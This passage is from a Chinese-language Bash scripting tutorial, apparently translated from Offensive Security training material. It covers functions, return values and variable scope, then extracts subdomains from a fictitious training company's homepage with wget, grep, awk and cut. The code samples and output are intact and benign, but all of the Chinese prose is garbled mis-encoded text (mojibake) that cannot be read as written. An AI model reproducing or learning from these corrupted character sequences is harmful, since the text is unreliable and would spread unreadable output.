¹æ®éœ€è¦è°ƒç”¨è¿™ä¸ªå‡½æ•°ã€‚\n\næ¢å¥è¯è¯´ï¼Œå‡½æ•°æ˜¯ä¸€ä¸ªå­ç¨‹åºï¼Œæˆ–ä¸€ä¸ªå®ç°ä¸€ç³»åˆ—æ“ä½œçš„ä»£ç å— `-a` ä¸€ä¸ªæ‰§è¡Œç‰¹å®šä»»åŠ¡çš„â€œé»‘åŒ£å­â€ã€‚å‡½æ•°å¯ä»¥ç”¨ä¸¤ç§ä¸åŒçš„æ ¼å¼æ¥ç¼–å†™ï¼Œç¬¬ä¸€ç§æ ¼å¼åœ¨ Bash è„šæœ¬ä¸­æ¯”è¾ƒå¸¸è§ã€‚\n\n```bash\nfunction function_name {\ncommands...\n}\n```\n\nç¬¬äºŒç§æ ¼å¼æ¥ C è¯­è¨€ç¨‹åºå‘˜æ¥è¯´æ›´ä¸ºç†Ÿæ‚‰ã€‚\n\n```bash\nfunction_name () {\ncommands...\n}\n```\n\nè¿™äº›æ ¼å¼åœ¨åŠŸèƒ½ä¸Šæ˜¯ç›¸åŒçš„ï¼Œæ˜¯ä¸ªäººåå¥½é—®é¢˜ã€‚è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼š\n\n```bash\nkali@kali:~$ cat ./func.sh\n#!/bin/bash\n# function example\n\nprint_me () {\n echo \"You have been printed!\"\n}\n\nprint_me\n\nkali@kali:~$ chmod +x ./func.sh\n\nkali@kali:~$ ./func.sh\nYou have been printed!\n```\n\nå‡½æ•°ä¹Ÿå¯ä»¥æ¥å—å‚æ•°ã€‚\n\n```bash\nkali@kali:~$ cat ./funcarg.sh\n#!/bin/bash\n# passing arguments to functions\n\npass_arg() {\n echo \"Today's random number is: $1\"\n}\n\npass_arg $RANDOM\n\nkali@kali:~$ chmod +x ./funcarg.sh\n\nkali@kali:~$ ./funcarg.sh\nToday's random number is: 25207\n```\n\nåœ¨æœ¬ä¾‹ä¸­ï¼Œæˆ‘ä»¬å‘å‡½æ•°ä¼ é€’äº†ä¸€ä¸ªéšæœºæ•° $RANDOMï¼Œè¯¥å‡½æ•°å°†å…¶è¾“å‡ºä¸º $1ï¼Œå³å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ã€‚è¯·æ³¨æ„ï¼Œå‡½æ•°å®šä¹‰ï¼ˆpass_arg()ï¼‰åŒ…å«æ‹¬å·ã€‚åœ¨å…¶ä»–ç¼–ç¨‹è¯­è¨€ä¸­ï¼Œä¾‹å¦‚ Cï¼Œè¿™äº›æ‹¬å·åŒ…å«äº†é¢„æœŸçš„å‚æ•°ï¼Œä½†æ˜¯åœ¨ Bash ä¸­ï¼Œæ‹¬å·åªæ˜¯ä½œä¸ºè£…é¥°ã€‚å®ƒä»¬ä»æ¥ä¸ä¼šè¢«ä½¿ç”¨ã€‚è¿˜è¦æ³¨æ„çš„æ˜¯ï¼Œå‡½æ•°å®šä¹‰ï¼ˆå‡½æ•°æœ¬èº«ï¼‰å¿…é¡»åœ¨è„šæœ¬ä¸­å‡ºç°ï¼Œç„¶åæ‰ä¼šè¢«è°ƒç”¨ã€‚ä»é€»è¾‘ä¸Šè®²ï¼Œæˆ‘ä»¬ä¸èƒ½è°ƒç”¨æˆ‘ä»¬æ²¡æœ‰å®šä¹‰çš„ä¸œè¥¿ã€‚\n\n<aside> ğŸ’¡ ä½¿ç”¨æè¿°æ€§çš„å‡½æ•°åç§°ï¼Œæè¿°å‡½æ•°çš„ç›®çš„ã€‚\n\n</aside>\n\né™¤äº†å‘ Bash å‡½æ•°ä¼ é€’å‚æ•°ä¹‹å¤–ï¼Œæˆ‘ä»¬å½“ç„¶ä¹Ÿå¯ä»¥ä» Bash å‡½æ•°ä¸­è¿”å›å€¼ã€‚Bash å‡½æ•°å®é™…ä¸Šä¸å…è®¸ä½ åœ¨ä¼ ç»Ÿæ„ä¹‰ä¸Šè¿”å›ä¸€ä¸ªä»»æ„çš„å€¼ã€‚ç›¸åï¼ŒBash å‡½æ•°å¯ä»¥è¿”å›ä¸€ä¸ªé€€å‡ºçŠ¶æ€ï¼ˆé›¶ä»£è¡¨æˆåŠŸï¼Œéé›¶è¡¨ç¤ºå¤±è´¥ï¼‰æˆ–è€…å…¶ä»–ä¸€äº›ä»»æ„çš„å€¼ï¼Œæˆ‘ä»¬å¯ä»¥éšåä» $? å…¨å±€å˜é‡ä¸­è®¿é—®è¿™äº›å€¼ã€‚å¦å¤–ï¼Œæˆ‘ä»¬ä¹Ÿå¯ä»¥åœ¨å‡½æ•°ä¸­è®¾ç½®ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œæˆ–è€…ä½¿ç”¨å‘½ä»¤æ›¿æ¢æ¥æ¨¡æ‹Ÿä¼ ç»Ÿçš„è¿”å›ã€‚\n\nè®©æˆ‘ä»¬çœ‹ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œå°†ä¸€ä¸ªéšæœºæ•°è¿”å›åˆ° $?ï¼š\n\n```bash\nkali@kali:~$ cat funcrvalue.sh\n#!/bin/bash\n# function return value example\n\nreturn_me() {\n echo \"Oh hello there, I'm returning a random value!\"\n return $RANDOM\n}\n\nreturn_me\n\necho \"The previous function returned a value of $?\"\n\nkali@kali:~$ chmod +x ./funcrvalue.sh\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 198\n\nkali@kali:~$ ./funcrvalue.sh\nOh hello there, I'm returning a random value!\nThe previous function returned a value of 313\n```\n\næ³¨æ„ï¼Œæ¯æ¬¡æˆ‘ä»¬è¿è¡Œè„šæœ¬æ—¶éƒ½ä¼šè¿”å›ä¸€ä¸ªéšæœºæ•°ï¼Œå› ä¸ºæˆ‘ä»¬è¿”å›äº†ç‰¹æ®Šçš„å…¨å±€å˜é‡ $RANDOMï¼ˆå˜æˆäº† $?ï¼‰å¦‚æœæˆ‘ä»¬ä½¿ç”¨ä¸å¸¦ $RANDOM å‚æ•°çš„è¿”å›è¯­å¥ï¼Œåˆ™ä¼šè¿”å›å‡½æ•°çš„é€€å‡ºçŠ¶æ€ï¼ˆæœ¬ä¾‹ä¸­ä¸º 0ï¼‰ã€‚ç°åœ¨æˆ‘ä»¬å¯¹å˜é‡å’Œå‡½æ•°æœ‰äº†åŸºæœ¬çš„äº†è§£ï¼Œæˆ‘ä»¬å¯ä»¥æ›´æ·±å…¥åœ°è®¨è®ºå˜é‡èŒƒå›´ã€‚\n\nå˜é‡çš„èŒƒå›´å°±æ˜¯å®ƒçš„æ„ä¹‰æ‰€åœ¨çš„ä¸Šä¸‹æ–‡ã€‚é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸€ä¸ªå˜é‡æœ‰ä¸€ä¸ªå…¨å±€èŒƒå›´ï¼Œè¿™æ„å‘³ç€å®ƒå¯ä»¥åœ¨æ•´ä¸ªè„šæœ¬ä¸­è¢«è®¿é—®ã€‚ç›¸åï¼Œå±€éƒ¨å˜é‡åªèƒ½åœ¨å®šä¹‰å®ƒçš„å‡½æ•°ã€ä»£ç å—å’Œå­ Shell ä¸­çœ‹åˆ°ã€‚æˆ‘ä»¬å¯ä»¥â€œè¦†ç›–â€ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œç»™å®ƒä¸€ä¸ªæœ¬åº•èŒƒå›´ï¼Œæ–¹æ³•æ˜¯åœ¨å£°æ˜å‰é¢åŠ ä¸Š local å…³é”®å­—ï¼Œè€Œä¸è§¦åŠ¨å…¨å±€å˜é‡ã€‚ä¸€èˆ¬çš„è¯­æ³•æ˜¯ï¼š\n\n```bash\nlocal name=\"Joe\"\n```\n\nè®©æˆ‘ä»¬é€šè¿‡ä¸€ä¸ªç®€å•çš„ä¾‹å­æ¥çœ‹çœ‹å±€éƒ¨å˜é‡å’Œå…¨å±€å˜é‡åœ¨å®è·µä¸­æ˜¯å¦‚ä½•å·¥ä½œçš„ï¼š\n\n```bash\nkali@kali:~$ cat ./varscope.sh\n#!/bin/bash\n# var scope example\n\nname1=\"John\"\nname2=\"Jason\"\n\nname_change() {\n local name1=\"Edward\"\n echo \"Inside of this function, name1 is $name1 and name2 is $name2\"\n name2=\"Lucas\"\n}\n\necho \"Before the function call, name1 is $name1 and name2 is $name2\"\n\nname_change\n\necho \"After the function call, name1 is $name1 and name2 is $name2\"\n\nkali@kali:~$ chmod +x ./varscope.sh\n\nkali@kali:~$ ./varscope.sh\nBefore the function call, name1 is John and name2 is Jason\nInside of this function, name1 is Edward and name2 is Jason\nAfter the function call, name1 is John and name2 is Lucas\n```\n\né¦–å…ˆæ³¨æ„åˆ°æˆ‘ä»¬å£°æ˜äº†ä¸¤ä¸ªå…¨å±€å˜é‡ï¼Œå°† name1 è®¾ç½®ä¸º Johnï¼Œname2 è®¾ç½®ä¸º Jasonã€‚\n\nç„¶åï¼Œæˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå‡½æ•°ï¼Œå¹¶åœ¨è¯¥å‡½æ•°ä¸­å£°æ˜äº†ä¸€ä¸ªåä¸º name1 çš„å±€éƒ¨å˜é‡ï¼Œå°†å…¶å€¼è®¾ç½®ä¸º Edwardã€‚ç”±äºè¿™æ˜¯ä¸€ä¸ªå±€éƒ¨å˜é‡ï¼Œä¹‹å‰çš„å…¨å±€èµ‹å€¼æ²¡æœ‰å—åˆ°å½±å“ï¼›åœ¨è¿™ä¸ªå‡½æ•°ä¹‹å¤–ï¼Œname1 ä»è¢«è®¾ç½®ä¸º Johnã€‚\n\næ¥ä¸‹æ¥ï¼Œæˆ‘ä»¬å°†  name2 è®¾ç½®ä¸º Lucasï¼Œç”±äºæˆ‘ä»¬æ²¡æœ‰ä½¿ç”¨å±€éƒ¨å…³é”®å­—ï¼Œæˆ‘ä»¬æ­£åœ¨æ”¹å˜å…¨å±€å˜é‡ï¼Œèµ‹å€¼åœ¨å‡½æ•°å†…éƒ¨å’Œå¤–éƒ¨éƒ½åšæŒã€‚\n\næ ¹æ®è¿™ä¸ªä¾‹å­ï¼Œä»¥ä¸‹ä¸¤ç‚¹æ€»ç»“äº†å˜é‡èŒƒå›´ï¼š\n\n- æ”¹å˜ä¸€ä¸ªä¸å…¨å±€å˜é‡åŒåçš„å±€éƒ¨å˜é‡çš„å€¼ä¸ä¼šå½±å“å…¶å…¨å±€å€¼ã€‚\n- åœ¨ä¸€ä¸ªå‡½æ•°ä¸­æ”¹å˜å…¨å±€å˜é‡çš„å€¼ -- æ²¡æœ‰å£°æ˜åŒåçš„å±€éƒ¨å˜é‡ -- å°†å½±å“å…¶å…¨å±€å€¼ã€‚\n\n## å®ä¾‹\n\nåˆ°ç›®å‰ä¸ºæ­¢ï¼Œæˆ‘ä»¬å·²ç»æ¶µç›–äº† Bash è„šæœ¬çš„åŸºç¡€çŸ¥è¯†ã€‚è®©æˆ‘ä»¬æŠŠæˆ‘ä»¬æ‰€è®¨è®ºçš„æ‰€æœ‰æ¦‚å¿µæ”¾åœ¨ä¸€èµ·ï¼Œå¹¶é€šè¿‡ä¸€äº›å®é™…çš„ä¾‹å­æ¥è¯´æ˜ã€‚\n\n### Bash çš„å®é™…ä½¿ç”¨ â€”â€” ä¾‹å­ 1\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬æƒ³æ‰¾åˆ°æ‰€æœ‰åˆ—åœ¨ [megacorpone.com](http://megacorpone.com) ä¸»é¡µä¸Šçš„å­åŸŸï¼Œå¹¶æ‰¾åˆ°ä»–ä»¬ç›¸åº”çš„ IP åœ°å€ã€‚æ‰‹åŠ¨æ“ä½œå¤ªæµªè´¹æ—¶é—´äº†ï¼Œä½†æ˜¯é€šè¿‡ä¸€äº›åŸºæœ¬çš„ Bash å‘½ä»¤ï¼Œæˆ‘ä»¬å¯ä»¥å°†å…¶å˜æˆä¸€é¡¹ç®€å•çš„ä»»åŠ¡ã€‚æˆ‘ä»¬å…ˆç”¨ `wget` ä¸‹è½½ç´¢å¼•é¡µã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# wget www.megacorpone.com\n--2022-03-30 02:53:08--  <http://www.megacorpone.com/>\næ­£åœ¨è§£æä¸»æœº www.megacorpone.com (www.megacorpone.com)... 149.56.244.87\næ­£åœ¨è¿æ¥ www.megacorpone.com (www.megacorpone.com)|149.56.244.87|:80... å·²è¿æ¥ã€‚\nå·²å‘å‡º HTTP è¯·æ±‚ï¼Œæ­£åœ¨ç­‰å¾…å›åº”... 200 OK\né•¿åº¦ï¼š14603 (14K) [text/html]\næ­£åœ¨ä¿å­˜è‡³: â€œindex.htmlâ€\n\nindex.html             100%[============================>]  14.26K  1.46KB/s  ç”¨æ—¶ 91s     \n\n2022-03-30 02:54:46 (160 B/s) - å·²ä¿å­˜ â€œindex.htmlâ€ [14603/14603])\n\n                                                                                            \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# ls -l index.html        \n-rw-r--r-- 1 root root 14603 11æœˆ  6  2019 index.html\n```\n\næ‰‹åŠ¨æ‰«æè¯¥æ–‡ä»¶ï¼Œæˆ‘ä»¬çœ‹åˆ°è®¸å¤šæˆ‘ä»¬ä¸éœ€è¦çš„è¡Œã€‚è®©æˆ‘ä»¬å¼€å§‹ç¼©å°æˆ‘ä»¬éœ€è¦çš„è¡Œçš„èŒƒå›´ï¼Œå¹¶å‰”é™¤æˆ‘ä»¬ä¸éœ€è¦çš„è¡Œã€‚é¦–å…ˆï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ grep â€œhref=â€ æ¥æå– index.html ä¸­æ‰€æœ‰åŒ…å« HTML é“¾æ¥çš„è¡Œã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# grep \"href=\" index.html                                                                                                                                                                                   130 â¨¯\n    <link rel=\"shortcut icon\" href=\"assets/ico/favicon.ico\">\n    <link href=\"assets/css/bootstrap.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/style.css\" rel=\"stylesheet\">\n    <link href=\"assets/css/font-awesome.min.css\" rel=\"stylesheet\">\n                <a class=\"navbar-brand\" href=\"index.html\">MegaCorp One</a>\n                    <li class=\"active\"><a href=\"//www.megacorpone.com/index.html\">HOME</a></li>\n                    <li><a href=\"<https://www.megacorpone.com/about.html>\">ABOUT</a></li>\n                    <li><a href=\"/contact.html\">CONTACT</a></li>\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <!--<li><a href=\"<https://www.offensive-security.com/offensive-security-solutions/virtual-penetration-testing-labs/>\">SUPPORT</a></li>-->\n                    <li><a href=\"<http://www.megacorpone.com/jobs.html>\">CAREERS</a></li>\n                    <!--<li><a href=\"<http://www.megacorpone.com/jobs2.html>\">CAREERS</a></li>-->\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n                <p><br/><a href=\"about.html\" class=\"btn btn-theme\">More Info</a></p>\n                    <li><a href=\"<http://test.megacorpone.com/demo/index.php>\">What are the ethics behind MegaCorp One?</a></li>\n                    <li><a href=\"<http://vpn.megacorpone.com/diffie-hellman/>\">Is MegaCorp One being regulated by any goverment?</a></li>\n                    <li><a href=\"<http://www.megacorpone.com/aboutus.html>\">Where can I buy MegaCorp One products?</li>\n                                <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Is there any environmental concerns related to nanotechnology?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">Can I suggest nanotechnology uses for the company to explore?</a></li>\n                    <li><a href=\"<http://www2.megacorpone.com/test/newsite/index.php>\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\n                <p><a href=\"<http://admin.megacorpone.com/news/today.php>\">MegaCorp One acquires new round of funding.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\n                <p><a href=\"<http://beta.megacorpone.com/util/files/news.html>\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n                    <p><small>This is a fictitious company, brought to you by <a href=\"<https://www.offensive-security.com/>\" target=\"_blank\">Offensive Security</a>.</small></p>\n                        <a href=\"<https://www.facebook.com/MegaCorp-One-393570024393695/>\" target=\"_blank\"><i class=\"fa fa-facebook\"></i></a>\n                        <a href=\"<https://twitter.com/joe_sheer/>\"><i class=\"fa fa-twitter\"></i></a>\n                        <a href=\"<https://www.linkedin.com/company/18268898/>\" target=\"_blank\"><i class=\"fa fa-linkedin\"></i></a>\n                        <a href=\"<https://github.com/megacorpone>\" target=\"_blank\"><i class=\"fa fa-github\"></i></a>\n```\n\nåœ¨ä¸Šé¢çš„æ‘˜å½•ä¸­ï¼Œç¬¬ä¸€è¡Œæ˜¯æˆ‘ä»¬æ­£åœ¨å¯»æ‰¾çš„ä¸€ä¸ªä¸»è¦ä¾‹å­ï¼Œå› ä¸ºå®ƒæåˆ°äº†ä¸€ä¸ªå­åŸŸã€‚\n\nè®©æˆ‘ä»¬ä½¿ç”¨ grep æ¥æŠ“å–åŒ…å« â€œ.megacorpone.comâ€ çš„è¡Œï¼Œè¡¨ç¤ºå­˜åœ¨ä¸€ä¸ªå­åŸŸï¼Œå¹¶ä½¿ç”¨ `grep -v` æ¥å‰¥ç¦»åŒ…å«æˆ‘ä»¬å·²ç»çŸ¥é“çš„æ— èŠçš„ â€œ[www.megacorpone.com](http://www.megacorpone.com)â€ åŸŸåçš„è¡Œã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\" | head\n                    <li><a href=\"<http://support.megacorpone.com>\">SUPPORT</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com>\">LOG IN</a></li>\n                    <!--<li><a href=\"<https://cp.megacorpone.net/>\">LOG IN</a></li>-->\n                    <li><a href=\"<http://admin.megacorpone.com/admin/index.html>\">Cell Regeneration</a></li>\n                    <li><a href=\"<http://intranet.megacorpone.com/pear/>\">Immune Systems Supplements</a></li>\n                    <li><a href=\"<http://mail.megacorpone.com/menu/>\">Micromachine Cyberisation Repair</a></li>\n                    <li><a href=\"<http://mail2.megacorpone.com/smtp/relay/>\">Nanomite Based Weaponry Systems</a></li>\n                    <li><a href=\"<http://siem.megacorpone.com/home/>\">Nanoprobe Based Entity Assimilation</a></li>\n                    <li><a href=\"<http://support.megacorpone.com/ticket/requests/index.html>\">Nanoprocessors</a></li>\n                    <li><a href=\"<http://syslog.megacorpone.com/logs/sys/view.php>\">Perlin VanHook Chemical Dispersal</a></li>\n```\n\nè¿™ä¸ªè¾“å‡ºçœ‹èµ·æ¥æ›´æ¥è¿‘æˆ‘ä»¬éœ€è¦çš„ä¸œè¥¿ã€‚é€šè¿‡é€»è¾‘çš„æ–¹å¼å‡å°‘æˆ‘ä»¬çš„æ•°æ®ï¼Œå¹¶åœ¨æ¯ä¸€æ¬¡ä¼ é€’ä¸­ä¾æ¬¡è¿›è¡Œæ›´å°çš„å‡å°‘ï¼Œæˆ‘ä»¬æ­£å¤„äºæ•°æ®å¤„ç†ä¸­æœ€å¸¸è§çš„å¾ªç¯ä¹‹ä¸­ã€‚\n\nçœ‹èµ·æ¥æ¯ä¸€è¡Œéƒ½åŒ…å«ä¸€ä¸ªé“¾æ¥å’Œä¸€ä¸ªå­åŸŸï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦æ‘†è„±æˆ‘ä»¬çš„é“¾æ¥å‘¨å›´çš„é¢å¤– HTMLã€‚åœ¨ Bash ä¸­æ‰§è¡Œçš„ä»»ä½•ä»»åŠ¡æ€»æ˜¯æœ‰å¤šç§æ–¹æ³•ï¼Œä½†æˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªé²œä¸ºäººçŸ¥çš„æ–¹æ³•æ¥å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬å°†ä½¿ç”¨ awk çš„ `-F` é€‰é¡¹æ¥è®¾ç½®å¤šå­—ç¬¦å®šç•Œç¬¦ï¼Œè¿™ä¸ cut ä¸åŒï¼Œåè€…ç®€å•è€Œæ–¹ä¾¿ï¼Œä½†åªå…è®¸å•å­—ç¬¦å®šç•Œç¬¦ã€‚æˆ‘ä»¬å°†è®¾ç½®æˆ‘ä»¬çš„åˆ†éš”ç¬¦ä¸º http://ï¼Œå¹¶å‘Šè¯‰ awk æˆ‘ä»¬æƒ³è¦ç¬¬äºŒä¸ªå­—æ®µï¼ˆâ€™{print $2}â€™ï¼‰ï¼Œæˆ–è€…è¯¥åˆ†éš”ç¬¦ä¹‹åçš„æ‰€æœ‰å†…å®¹ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# grep \"href=\" index.html | grep \".megacorpone\" | grep -v \"www.megacorpone.com\"|awk -F \"http://\" '{print $2}'\nsupport.megacorpone.com\">SUPPORT</a></li>\nintranet.megacorpone.com\">LOG IN</a></li>\n\nadmin.megacorpone.com/admin/index.html\">Cell Regeneration</a></li>\nintranet.megacorpone.com/pear/\">Immune Systems Supplements</a></li>\nmail.megacorpone.com/menu/\">Micromachine Cyberisation Repair</a></li>\nmail2.megacorpone.com/smtp/relay/\">Nanomite Based Weaponry Systems</a></li>\nsiem.megacorpone.com/home/\">Nanoprobe Based Entity Assimilation</a></li>\nsupport.megacorpone.com/ticket/requests/index.html\">Nanoprocessors</a></li>\nsyslog.megacorpone.com/logs/sys/view.php\">Perlin VanHook Chemical Dispersal</a></li>\ntest.megacorpone.com/demo/index.php\">What are the ethics behind MegaCorp One?</a></li>\nvpn.megacorpone.com/diffie-hellman/\">Is MegaCorp One being regulated by any goverment?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Is there any environmental concerns related to nanotechnology?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">Can I suggest nanotechnology uses for the company to explore?</a></li>\nwww2.megacorpone.com/test/newsite/index.php\">What are the specs behind MegaCorpOne nanoprocessors?</a></li>\nadmin.megacorpone.com/news/today.php\">MegaCorp One acquires new round of funding.</a></p>\nbeta.megacorpone.com/util/files/news.html\">Lawsuit against MegaCorp One is dropped when plaintiffs go missing.</a></p>\nbeta.megacorpone.com/util/files/news.html\">MegaCorp One CEO Joe Sheer nominated for Nobel Physics, Medicine, and Literature prizes.</a></p>\n```\n\nåœ¨æˆ‘ä»¬çš„è¾“å‡ºä¸­ï¼Œæ¯ä¸€è¡Œçš„å¼€å¤´éƒ½è¡¨æ˜æˆ‘ä»¬åœ¨æ­£ç¡®çš„è½¨é“ä¸Šã€‚ç°åœ¨ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨å‰ªåˆ‡æ³•å°†åˆ†éš”ç¬¦è®¾ç½®ä¸º â€œ/â€ï¼ˆç”¨ -dï¼‰ï¼Œå¹¶æ‰“å°ç¬¬ä¸€ä¸ªå­—æ®µï¼ˆç”¨ -f 1ï¼‰ï¼Œåªç•™ä¸‹å®Œæ•´çš„å­åŸŸåç§°ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# grep \"href=\" index.html | grep \"\\\\.megacorpone\" | grep -v \"www\\\\.megacorpone\\\\.com\" | awk -F \"http://\" '{print $2}'|cut -d \"/\" -f 1\nsupport.megacorpone.com\">SUPPORT<\nintranet.megacorpone.com\">LOG IN<\n\nadmin.megacorpone.com\nintranet.megacorpone.com\nmail.megacorpone.com\nmail2.megacorpone.com\nsiem.megacorpone.com\nsupport.megacorpone.com\nsyslog.megacorpone.com\ntest.megacorpone.com\nvpn.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nwww2.megacorpone.com\nadmin.megacorpone.com\nbeta.megacorpone.com\nbeta.megacorpone.com\n```\n\nè¿™çœ‹èµ·æ¥å¾ˆå¥½ï¼ç„¶è€Œï¼Œä»»ä½• Bash å¤§å¸ˆçœ‹ä¸€çœ¼æˆ‘ä»¬çš„å·¥ä½œå°±ä¼šå—¤ä¹‹ä»¥é¼»ã€‚é‚£æ˜¯åº”è¯¥çš„ï¼Œå› ä¸ºæˆ‘ä»¬ä»¥ä¸€ç§ç¬¨æ‹™çš„æ–¹å¼ä½¿ç”¨äº†åŸºæœ¬çš„å·¥å…·ï¼Œå°½ç®¡æˆ‘ä»¬çš„å‰Šå‡æ˜¯ç›¸å½“åˆç†çš„ã€‚Bash åŠå…¶ç›¸å…³çš„å‘½ä»¤å’Œå†…ç½®ç¨‹åºæ˜¯ç›¸å½“å¼ºå¤§çš„ï¼Œè€Œä¸”æ€»æ˜¯æœ‰æ›´å¤šçš„ä¸œè¥¿éœ€è¦å­¦ä¹ ã€‚\n\nå¦‚æœæˆ‘ä»¬å¯¹è‡ªå·±çš„å·¥ä½œè¿›è¡Œæ‰¹è¯„ï¼Œä»¥åŠªåŠ›æ”¹è¿›ï¼ˆæˆ‘ä»¬åº”è¯¥ä¸€ç›´è¿™æ ·åšï¼‰ï¼Œæˆ‘ä»¬å¯èƒ½ä¼šçœ‹åˆ°ä¸€äº›ç®€å•çš„æ”¹è¿›æ–¹æ³•ã€‚é¦–å…ˆï¼Œæˆ‘ä»¬ç”¨ â€œhref=â€ å¼€å§‹æœç´¢ï¼Œåæ¥åˆæœç´¢äº† http://ã€‚è¿™ä¸¤è€…æœ¬è´¨ä¸Šéƒ½æ˜¯è¿æ¥ï¼Œä½†è¿™è¦æ±‚æ¯ä¸€è¡Œéƒ½æœ‰è¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ã€‚å¦‚æœæŸä¸€è¡Œåªæœ‰ http://ï¼Œè€Œæ²¡æœ‰ â€œherf=â€ï¼Œæˆ‘ä»¬å°±ä¼šé”™è¿‡ä¸€è¡Œã€‚åº”è¯¥é¿å…å†—ä½™ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†å¤§æ–‡ä»¶çš„æ—¶å€™ã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬å¹¶ä¸çœŸæ­£å…³å¿ƒé“¾æ¥ï¼Œå¿…ç„¶çš„ï¼Œæˆ‘ä»¬æ­£åœ¨å¯»æ‰¾ä»¥ â€œ.megacorpone.comâ€ ç»“å°¾çš„å­åŸŸï¼Œè€Œä¸ç®¡è¿™ä¸ªå¼•ç”¨æ˜¯å¦åŒ…å«åœ¨ä¸€ä¸ªé“¾æ¥ä¸­ã€‚\n\nå¦ä¸€ä»¶éœ€è¦è€ƒè™‘çš„äº‹æƒ…æ˜¯ï¼Œæˆ‘ä»¬èŠ±äº†å¤§é‡çš„æ—¶é—´å’Œç²¾åŠ›åœ¨æœç´¢ç»“æœä¸­å¯»æ‰¾å’Œåˆ†å‰²å‡ºå­åŸŸåç§°ã€‚è¿™å¾ˆç¬¨æ‹™ï¼Œå®¹æ˜“å‡ºé”™ï¼Œè€Œä¸”æ¯«æ— æ„ä¹‰ï¼Œå› ä¸ºå½¢åŠ¿è‰¯å¥½çš„æ­£åˆ™è¡¨è¾¾å¼æœç´¢å¯ä»¥è½»æ¾å¤„ç†è¿™ä¸ªé—®é¢˜ã€‚æˆ‘ä»¬ä»¥å‰æåˆ°è¿‡æ­£åˆ™è¡¨è¾¾å¼çš„ä¸ºä¾‹ï¼Œä½†æ˜¯ç°åœ¨è®©æˆ‘ä»¬çœ‹ä¸€ä¸ªå®é™…çš„ä¾‹å­ï¼Œæˆ‘ä»¬å·²ç»é‡‡å–äº†è§£å†³è¿™ä¸ªé—®é¢˜çš„è‰°éš¾é€”å¾„ã€‚\n\nåœ¨è¿™ä¸ªä¾‹å­ä¸­ï¼Œæˆ‘ä»¬å°†ä½¿ç”¨ä¸€ä¸ªç®€å•çš„æ­£åˆ™è¡¨è¾¾å¼å°† â€œ.megacorpone.comâ€ å­åŸŸä»æˆ‘ä»¬çš„æ–‡ä»¶ä¸­åˆ†å‰²å‡ºæ¥ã€‚\n\n```bash\nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# grep -o '[^/]*\\\\.megacorpone\\\\.com' index.html | sort -u > list.txt\n                                                                                     \nâ”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]\nâ””â”€# cat list.txt                                                     